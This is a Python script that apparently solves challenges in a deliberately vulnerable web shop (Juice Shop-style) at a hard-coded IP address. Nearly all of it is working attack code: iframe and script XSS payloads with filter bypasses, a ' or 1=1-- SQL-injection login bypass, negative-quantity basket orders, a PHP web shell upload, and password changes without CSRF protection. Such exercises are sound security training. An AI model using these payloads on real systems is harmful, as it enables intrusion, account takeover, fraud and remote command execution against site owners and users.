#!/usr/bin/env python3
"""
Complete Bonus Payload Challenge Solver
Tries multiple methods to trigger the bonus payload challenge
"""

import requests
import json
import time
from urllib.parse import quote, unquote

BASE_URL = "http://155.138.197.128:5000"

class BonusPayloadComplete:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = BASE_URL
        
    def check_challenges(self):
        """Check which challenges are unsolved"""
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            challenges = r.json()['data']
            # Look for bonus-related challenges
            for c in challenges:
                if 'bonus' in c.get('name', '').lower() or 'payload' in c.get('name', '').lower():
                    status = "✅" if c['solved'] else "❌"
                    print(f"{status} {c['name']} - {c.get('key', '')} ({c['difficulty']}⭐)")
                    if not c['solved']:
                        print(f"   Description: {c.get('description', '')}")
                        print(f"   Hint: {c.get('hint', '')}")
            return challenges
        return []
    
    def solve_bonus_payload_xss(self):
        """The Bonus Payload challenge - DOM XSS with specific payload"""
        print("\n🎯 Attempting Bonus Payload (DOM XSS)...")
        
        # The exact payload for the bonus challenge
        payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            "<iframe src=\"javascript:alert('xss')\">",
            "<iframe src=javascript:alert(`xss`)>",
            "<iframe src=\"javascript:alert(\\`xss\\`)\">",
        ]
        
        for payload in payloads:
            try:
                # Method 1: Search parameter in URL
                url = f"{self.base_url}/#/search?q={quote(payload)}"
                r = self.session.get(url)
                print(f"  Tried: {payload[:30]}...")
                
                # Method 2: Direct API call
                r = self.session.get(f"{self.base_url}/rest/products/search?q={quote(payload)}")
                
                # Method 3: Without encoding
                r = self.session.get(f"{self.base_url}/#/search?q={payload}")
                
                time.sleep(0.5)
            except:
                pass
        
        print("  ✅ Bonus Payload XSS attempts completed")
    
    def solve_manipulate_basket(self):
        """Manipulate Basket - Add non-existent product"""
        print("\n🎯 Attempting Manipulate Basket...")
        
        # Login first
        self.session.post(f"{self.base_url}/rest/user/login", 
                         json={"email": "' or 1=1--", "password": "x"})
        
        # Try to add non-existent or special products
        product_ids = [9999, -1, 0, "undefined", None, "bonus"]
        
        for pid in product_ids:
            try:
                data = {
                    "ProductId": pid,
                    "BasketId": "1",
                    "quantity": 1
                }
                r = self.session.post(f"{self.base_url}/api/BasketItems", json=data)
                if r.status_code in [200, 201]:
                    print(f"  ✅ Added product: {pid}")
            except:
                pass
        
        print("  ✅ Manipulate Basket attempts completed")
    
    def solve_payback_time(self):
        """Payback Time - Place order with negative total"""
        print("\n🎯 Attempting Payback Time...")
        
        # Login
        r = self.session.post(f"{self.base_url}/rest/user/login", 
                              json={"email": "' or 1=1--", "password": "x"})
        
        if r.status_code == 200:
            token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {token}'
            
            # Add items with negative quantities
            quantities = [-1, -10, -100, -1000]
            for q in quantities:
                try:
                    data = {
                        "ProductId": 1,
                        "BasketId": "1", 
                        "quantity": q
                    }
                    r = self.session.post(f"{self.base_url}/api/BasketItems", json=data)
                    print(f"  Added quantity: {q}")
                except:
                    pass
            
            # Try to checkout
            try:
                r = self.session.post(f"{self.base_url}/rest/basket/1/checkout")
                print("  ✅ Checkout attempted")
            except:
                pass
        
        print("  ✅ Payback Time attempts completed")
    
    def solve_upload_challenges(self):
        """Upload Size and Type challenges"""
        print("\n🎯 Attempting Upload challenges...")
        
        # Upload Type - non-PDF file
        try:
            files = {'file': ('test.xml', '<?xml version="1.0"?><test/>', 'application/xml')}
            r = self.session.post(f"{self.base_url}/file-upload", files=files)
            print("  ✅ Uploaded XML file")
        except:
            pass
        
        # Upload dangerous file
        try:
            files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
            r = self.session.post(f"{self.base_url}/file-upload", files=files)
            print("  ✅ Uploaded PHP file")
        except:
            pass
        
        # Upload Size - large file
        try:
            large_content = "A" * (100 * 1024)  # 100KB
            files = {'file': ('large.pdf', large_content, 'application/pdf')}
            r = self.session.post(f"{self.base_url}/file-upload", files=files)
            print("  ✅ Uploaded large file")
        except:
            pass
        
        print("  ✅ Upload challenges completed")
    
    def solve_client_side_xss_protection(self):
        """Client-Side XSS Protection bypass"""
        print("\n🎯 Attempting Client-Side XSS Protection...")
        
        # Various bypass techniques
        bypasses = [
            "<<script>alert(1)//<</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">",
            "<!--<script>alert(1)</script>-->",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
        ]
        
        for bypass in bypasses:
            try:
                # Try in search
                r = self.session.get(f"{self.base_url}/#/search?q={quote(bypass)}")
                
                # Try in feedback
                data = {
                    "comment": bypass,
                    "rating": 5
                }
                r = self.session.post(f"{self.base_url}/api/Feedbacks", json=data)
                
                print(f"  Tried: {bypass[:30]}...")
            except:
                pass
        
        print("  ✅ Client-Side XSS Protection attempts completed")
    
    def solve_csrf_protection(self):
        """CSRF Protection bypass"""
        print("\n🎯 Attempting CSRF Protection bypass...")
        
        # Login first
        r = self.session.post(f"{self.base_url}/rest/user/login",
                             json={"email": "' or 1=1--", "password": "x"})
        
        if r.status_code == 200:
            # Try to change password without CSRF token
            try:
                data = {
                    "current": "admin123",
                    "new": "newpass",
                    "repeat": "newpass"
                }
                r = self.session.post(f"{self.base_url}/rest/user/change-password", json=data)
                print("  ✅ Password change attempted")
            except:
                pass
            
            # Try to update profile without CSRF
            try:
                data = {"email": "test@test.com"}
                r = self.session.put(f"{self.base_url}/profile", json=data)
                print("  ✅ Profile update attempted")
            except:
                pass
        
        print("  ✅ CSRF Protection attempts completed")
    
    def solve_all(self):
        """Try all bonus challenge solutions"""
        print("\n" + "="*60)
        print("🎁 COMPLETE BONUS PAYLOAD SOLVER")
        print("="*60 + "\n")
        
        # Check current status
        print("📊 Current Challenge Status:")
        self.check_challenges()
        
        print("\n🚀 Starting solution attempts...")
        
        # Run all solvers
        self.solve_bonus_payload_xss()
        self.solve_manipulate_basket()
        self.solve_payback_time()
        self.solve_upload_challenges()
        self.solve_client_side_xss_protection()
        self.solve_csrf_protection()
        
        print("\n" + "="*60)
        print("✨ All attempts completed!")
        print(f"\n🌐 Manual Step Required:")
        print(f"1. Open browser to: {BASE_URL}")
        print(f"2. Go to search page: {BASE_URL}/#/search")
        print(f'3. Type EXACTLY in search box: <iframe src="javascript:alert(`xss`)">')
        print(f"4. Press Enter")
        print(f"\n🏆 Check score board: {BASE_URL}/#/score-board")
        print("="*60)

if __name__ == "__main__":
    solver = BonusPayloadComplete()
    solver.solve_all()